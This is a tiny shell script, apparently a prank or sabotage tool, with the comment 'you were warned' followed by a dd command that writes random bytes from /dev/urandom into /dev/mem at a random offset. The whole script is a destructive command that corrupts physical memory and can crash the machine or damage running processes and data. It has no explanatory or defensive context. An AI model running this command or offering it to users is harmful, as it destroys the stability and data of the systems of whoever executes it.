#!/bin/sh
#you were warned
dd if=/dev/urandom of=/dev/mem bs=512 seek=$RANDOM
